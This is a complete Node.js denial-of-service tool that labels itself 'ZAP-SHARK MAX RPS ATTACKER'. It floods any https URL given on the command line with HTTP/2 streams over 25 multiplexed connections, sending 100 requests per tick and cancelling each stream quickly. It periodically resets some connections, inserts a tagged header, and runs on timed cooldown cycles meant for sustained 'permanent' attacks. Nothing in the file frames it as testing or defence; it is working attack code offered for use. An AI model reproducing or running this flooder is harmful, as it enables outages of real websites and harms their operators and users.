const http2 = require('http2');

class ZAPSHARK_HIGH_RPS {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // HIGH PERFORMANCE CONNECTION POOL
        this.connections = [];
        this.connectionCount = 25; // 25 CONNECTIONS FOR MAX RPS
        
        // PAYLOAD SYSTEM (EVERY 1-5M)
        this.payloadCounter = 0;
        this.nextPayloadAt = 1000000 + Math.floor(Math.random() * 4000000);
        
        // RESET SYSTEM
        this.resetCounter = 0;
        
        // MAINTENANCE
        this.maintenanceCounter = 0;
        this.inMaintenance = false;
        
        // STATS
        this.peakRPS = 0;
    }

    // === ULTRA FAST CONNECTION SETUP ===
    setupConnections() {
        console.log('[+] Creating high-speed connections...');
        for (let i = 0; i < this.connectionCount; i++) {
            setTimeout(() => {
                try {
                    const client = http2.connect(this.targetUrl);
                    client.setMaxListeners(0); // NO LIMIT
                    client.on('error', () => {});
                    this.connections.push(client);
                } catch (err) {
                    // SILENT FAIL - TRY AGAIN LATER
                }
            }, i * 10); // STAGGERED
        }
    }

    // === MAX RPS ATTACK ===
    attack() {
        if (this.inMaintenance || this.connections.length === 0) return;
        
        // RAPID RESET EVERY 100K REQUESTS
        this.resetCounter++;
        if (this.resetCounter >= 100000) {
            this.resetCounter = 0;
            this.resetConnections();
        }
        
        // CHECK FOR PAYLOAD
        const sendPayload = this.checkPayload();
        
        // AGGRESSIVE MULTIPLEXING - 100 STREAMS PER TICK
        for (let i = 0; i < 100; i++) {
            const client = this.connections[Math.floor(Math.random() * this.connections.length)];
            if (!client) continue;
            
            this.sendStream(client, sendPayload);
        }
    }

    // === STREAM CREATION (NO MEMORY LEAK) ===
    sendStream(client, sendPayload) {
        try {
            const req = client.request({
                ':method': 'GET',
                ':path': '/',
                ...(sendPayload && { 'x-shark': 'T.Ø.Š-$HĀRKWIRE-TØR' })
            });
            
            // ULTRA MINIMAL EVENT HANDLING
            req.on('close', () => {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            });
            
            // DESTROY IMMEDIATELY AFTER SENDING
            req.end();
            
            // FORCE CLOSE AFTER 50ms TO PREVENT BUILDUP
            setTimeout(() => {
                try { req.destroy(); } catch (e) {}
            }, 50);
            
        } catch (err) {
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        }
    }

    // === PAYLOAD CHECK ===
    checkPayload() {
        this.payloadCounter++;
        if (this.payloadCounter >= this.nextPayloadAt) {
            this.payloadCounter = 0;
            this.nextPayloadAt = 1000000 + Math.floor(Math.random() * 4000000);
            return true;
        }
        return false;
    }

    // === RAPID CONNECTION RESET ===
    resetConnections() {
        // RESET 20% OF CONNECTIONS
        const resetCount = Math.ceil(this.connections.length * 0.2);
        
        for (let i = 0; i < resetCount; i++) {
            const index = Math.floor(Math.random() * this.connections.length);
            try {
                this.connections[index].destroy();
                const newClient = http2.connect(this.targetUrl);
                newClient.setMaxListeners(0);
                newClient.on('error', () => {});
                this.connections[index] = newClient;
            } catch (err) {}
        }
    }

    // === MAINTENANCE (EVERY 20 MIN) ===
    checkMaintenance() {
        this.maintenanceCounter++;
        
        // 20 MINUTES = APPROX 1.2M ATTACK CYCLES
        if (this.maintenanceCounter >= 1200000 && !this.inMaintenance) {
            this.startMaintenance();
        }
    }

    startMaintenance() {
        console.log('\n[!] MAINTENANCE - 20 MIN COOLDOWN [!]');
        this.inMaintenance = true;
        
        // DESTROY ALL CONNECTIONS
        this.connections.forEach(c => {
            try { c.destroy(); } catch (e) {}
        });
        this.connections = [];
        
        // WAIT 20 MINUTES
        setTimeout(() => {
            this.endMaintenance();
        }, 1200000);
    }

    endMaintenance() {
        console.log('\n[+] MAINTENANCE COMPLETE - RESUMING MAX RPS [+]');
        this.inMaintenance = false;
        this.maintenanceCounter = 0;
        
        // REBUILD CONNECTIONS
        this.setupConnections();
    }

    // === STATS ===
    calculateRPS() {
        const now = Date.now();
        const elapsed = (now - this.lastRpsCalc) / 1000;
        
        if (elapsed >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / elapsed;
            this.peakRPS = Math.max(this.peakRPS, this.currentRPS);
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    displayStats() {
        this.calculateRPS();
        
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`=== ZAP-SHARK MAX RPS ===`);
        console.log(`RUNTIME: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`);
        console.log('='.repeat(50));
        console.log(`REQUESTS: ${this.totalRequests.toLocaleString()}`);
        console.log(`RPS: ${this.currentRPS.toFixed(1)} | PEAK: ${this.peakRPS.toFixed(1)}`);
        console.log(`CONNECTIONS: ${this.connections.length}`);
        console.log(`NEXT PAYLOAD: ${(this.nextPayloadAt - this.payloadCounter).toLocaleString()}`);
        console.log(`NEXT MAINT: ${Math.max(0, 1200000 - this.maintenanceCounter).toLocaleString()} cycles`);
        console.log('='.repeat(50));
    }

    // === MAIN ===
    start() {
        console.log('=== ZAP-SHARK MAX RPS ATTACKER ===');
        console.log('Target:', this.targetUrl);
        console.log('Connections:', this.connectionCount);
        console.log('Mode: ULTRA HIGH RPS | PERMANENT');
        console.log('='.repeat(50));
        
        this.setupConnections();
        
        // WAIT FOR CONNECTIONS
        setTimeout(() => {
            // MAIN ATTACK LOOP (ULTRA FAST)
            const attackLoop = setInterval(() => {
                if (!this.inMaintenance) {
                    this.attack();
                    this.checkMaintenance();
                }
            }, 0.01); // 10,000 ATTACKS PER SECOND
            
            // DISPLAY LOOP
            const displayLoop = setInterval(() => {
                this.displayStats();
            }, 100);
            
            // CLEANUP ON EXIT
            process.on('SIGINT', () => {
                clearInterval(attackLoop);
                clearInterval(displayLoop);
                
                console.log('\n\n=== FINAL STATS ===');
                console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
                console.log(`Peak RPS: ${this.peakRPS.toFixed(1)}`);
                console.log(`Runtime: ${Math.floor((Date.now() - this.startTime) / 1000)}s`);
                console.log('='.repeat(50));
                
                this.connections.forEach(c => {
                    try { c.destroy(); } catch (e) {}
                });
                
                process.exit(0);
            });
            
        }, 3000);
    }
}

// USAGE WITH MAX PERFORMANCE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node --max-old-space-size=8192 shark-max.js https://target.com');
    process.exit(1);
}

// INCREASE OS LIMITS
require('http2').setMaxListeners(0);
process.setMaxListeners(0);

const shark = new ZAPSHARK_HIGH_RPS(target);
shark.start();
